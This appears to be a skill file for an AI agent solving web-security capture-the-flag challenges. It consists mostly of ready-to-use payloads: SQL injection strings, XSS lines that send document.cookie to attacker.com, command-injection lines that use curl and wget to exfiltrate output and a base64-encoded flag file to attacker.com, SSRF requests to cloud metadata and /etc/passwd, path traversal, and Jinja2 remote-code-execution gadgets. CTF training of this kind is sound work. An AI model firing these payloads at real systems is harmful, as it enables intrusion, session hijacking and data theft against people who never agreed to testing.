---
name: web
description: Web security testing techniques and methodology. Use when solving SQL injection, XSS, SSRF, authentication bypass, or other web application challenges.
---

# Web Security (Web)

Techniques and methodology for web security CTF challenges.

## Pre-installed Tools

- `sqlmap` - SQL injection automation
- `nikto` - Web server scanner
- `curl` - HTTP client
- `requests` - Python HTTP library
- Python HTTP server at `http://<ctf_host>:8000` for data exfiltration

## Initial Analysis

### 1. Reconnaissance

```bash
# Check technologies
docker exec $CTF_CONTAINER curl -I http://challenge.server/

# Directory enumeration
docker exec $CTF_CONTAINER nikto -h http://challenge.server/

# Common paths
docker exec $CTF_CONTAINER bash -c '
for path in robots.txt .git/config .env admin login api; do
    curl -s -o /dev/null -w "%{http_code} $path\n" http://challenge.server/$path
done'
```

### 2. Source Code Review

```bash
# View page source
docker exec $CTF_CONTAINER curl http://challenge.server/ | head -100

# Check JavaScript files
docker exec $CTF_CONTAINER curl http://challenge.server/static/app.js
```

## Common Vulnerabilities

### SQL Injection

**Detection**:
```bash
# Manual testing
docker exec $CTF_CONTAINER curl "http://challenge.server/login?user=admin'&pass=test"

# SQLMap
docker exec $CTF_CONTAINER sqlmap -u "http://challenge.server/login?user=admin&pass=test" --batch
```

**Payloads**:
```sql
-- Authentication bypass
' OR '1'='1
' OR 1=1--
admin'--
' UNION SELECT 1,2,3--

-- Data extraction
' UNION SELECT username,password FROM users--
' UNION SELECT table_name,column_name FROM information_schema.columns--

-- Blind SQLi
' AND SUBSTRING(database(),1,1)='a'--
' AND (SELECT SLEEP(5))--
```

### Cross-Site Scripting (XSS)

**Payloads**:
```javascript
// Basic
<script>alert(1)</script>

// Event handlers
<img src=x onerror=alert(1)>
<svg onload=alert(1)>

// Cookie stealing
<script>new Image().src="http://attacker.com/?c="+document.cookie</script>

// DOM-based
<script>location='http://attacker.com/?'+document.cookie</script>
```

**Exfiltration**:
```bash
# Start listener on CTF server
docker exec $CTF_CONTAINER python3 -m http.server 8000 &

# XSS payload to send data
<script>fetch('http://ctf_server:8000/?data='+btoa(document.cookie))</script>
```

### Server-Side Request Forgery (SSRF)

```bash
# Internal service access
docker exec $CTF_CONTAINER curl "http://challenge.server/fetch?url=http://localhost:8080"

# Cloud metadata
docker exec $CTF_CONTAINER curl "http://challenge.server/fetch?url=http://169.254.169.254/latest/meta-data/"

# File access
docker exec $CTF_CONTAINER curl "http://challenge.server/fetch?url=file:///etc/passwd"
```

### Command Injection

**Payloads**:
```bash
# Basic
; ls
| cat /etc/passwd
$(whoami)
`id`

# Blind (with sleep)
; sleep 5
| sleep 5

# Out-of-band
; curl http://attacker.com/$(whoami)
; wget http://attacker.com/?data=$(cat /flag | base64)
```

### Path Traversal

```bash
# Basic
docker exec $CTF_CONTAINER curl "http://challenge.server/file?path=../../../etc/passwd"

# Encoded
docker exec $CTF_CONTAINER curl "http://challenge.server/file?path=..%2F..%2F..%2Fetc%2Fpasswd"

# Null byte (older systems)
docker exec $CTF_CONTAINER curl "http://challenge.server/file?path=../../../etc/passwd%00.jpg"
```

### Authentication Bypass

```bash
# JWT manipulation
# - Change algorithm to 'none'
# - Crack weak secrets
# - Key confusion attacks

# Cookie manipulation
docker exec $CTF_CONTAINER curl -b "admin=true" http://challenge.server/admin

# Parameter pollution
docker exec $CTF_CONTAINER curl "http://challenge.server/login?role=admin&role=user"
```

### Template Injection (SSTI)

**Detection**:
```bash
# Test for Jinja2/Twig
docker exec $CTF_CONTAINER curl "http://challenge.server/?name={{7*7}}"

# Test for ERB
docker exec $CTF_CONTAINER curl "http://challenge.server/?name=<%= 7*7 %>"
```

**Payloads**:
```python
# Jinja2 RCE
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
{{''.__class__.__mro__[1].__subclasses__()[408]('cat /flag',shell=True,stdout=-1).communicate()}}
```

## Python Requests Template

```python
#!/usr/bin/env python3
import requests

BASE_URL = "http://challenge.server"
session = requests.Session()

# Login
resp = session.post(f"{BASE_URL}/login", data={
    "username": "admin",
    "password": "password"
})

# Authenticated request
resp = session.get(f"{BASE_URL}/admin")
print(resp.text)

# With custom headers
resp = session.get(f"{BASE_URL}/api", headers={
    "Authorization": "Bearer token",
    "X-Forwarded-For": "127.0.0.1"
})
```

## Burp Suite Alternative (mitmproxy)

```bash
# Start proxy
docker exec $CTF_CONTAINER mitmproxy -p 8080

# Use proxy
docker exec $CTF_CONTAINER curl -x http://localhost:8080 http://challenge.server/
```

## See Also

- [run-command](../run-command/SKILL.md) - Run web tools
- [create-file](../create-file/SKILL.md) - Save exploit scripts
